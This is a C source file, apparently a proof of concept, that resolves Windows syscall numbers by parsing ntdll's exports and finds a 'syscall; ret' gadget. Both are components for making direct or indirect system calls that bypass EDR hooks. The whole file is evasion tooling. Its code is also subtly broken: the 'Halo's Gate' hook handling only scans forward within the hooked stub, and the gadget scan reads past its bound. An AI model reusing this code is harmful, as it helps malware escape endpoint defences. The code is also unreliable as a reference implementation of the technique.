#include <windows.h>
#include <stdio.h>
#include "syscalls.h"

// Structs for PE parsing (simplified)
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
    BYTE       Reserved1[8];
    PVOID      Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE          Reserved1[2];
    BYTE          BeingDebugged;
    BYTE          Reserved2[1];
    PVOID         Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

// Helper to get PEB
#if defined(_WIN64)
#define GetPEB() ((PPEB)__readgsqword(0x60))
#else
#define GetPEB() ((PPEB)__readfsdword(0x30))
#endif

DWORD GetSSN(const char* funcName)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return -1;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hNtdll +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* pNames = (DWORD*)((BYTE*)hNtdll + pExport->AddressOfNames);
    DWORD* pFunctions = (DWORD*)((BYTE*)hNtdll + pExport->AddressOfFunctions);
    WORD* pOrdinals = (WORD*)((BYTE*)hNtdll + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++)
    {
        char* name = (char*)((BYTE*)hNtdll + pNames[i]);
        if (strcmp(name, funcName) == 0)
        {
            // Found the function, now get address
            void* funcAddr = (void*)((BYTE*)hNtdll + pFunctions[pOrdinals[i]]);

            // Halo's Gate Logic: parsing the stub to find SSN
            // Typical stub:
            // 4c 8b d1       mov r10, rcx
            // b8 XX XX XX XX mov eax, SSN
            // 0f 05          syscall

            BYTE* pByte = (BYTE*)funcAddr;

            // Check for potential hook (e.g., jmp instruction 0xE9)
            if (*pByte == 0xE9) {
                // Hooked! Try to check neighbors (Halo's Gate)
                // For simplicity in this PoC, we scan forward/backward a few bytes
                // knowing that syscall numbers are sequential.
                // Or just search down until we find a clean syscall stub (mov eax, ...)
                // This is a naive implementation:
                for (int idx = 0; idx < 32; idx++) {
                    if (*(pByte + idx) == 0xB8) { // mov eax, ...
                         return *(DWORD*)(pByte + idx + 1);
                    }
                }
            }

            // Standard check
            if (*pByte == 0x4C && *(pByte + 3) == 0xB8) {
                return *(DWORD*)(pByte + 4);
            }

            // Fallback: If we can't read it directly (e.g. wildly hooked), fail.
            return -1;
        }
    }
    return -1;
}

PVOID GetSyscallGadget()
{
    // Find a 'syscall; ret' gadget in ntdll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return NULL;

    // We can scan the text section. For speed/simplicity, just scan export of a common function known to have it
    // Or scan linearly from base.

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (strncmp((char*)pSec[i].Name, ".text", 5) == 0) {
            BYTE* start = (BYTE*)hNtdll + pSec[i].VirtualAddress;
            DWORD size = pSec[i].Misc.VirtualSize;

            for (DWORD j = 0; j < size - 1; j++) {
                // 0F 05 C3 = syscall; ret
                if (start[j] == 0x0F && start[j+1] == 0x05 && start[j+2] == 0xC3) {
                    return (PVOID)(start + j);
                }
            }
        }
    }
    return NULL;
}
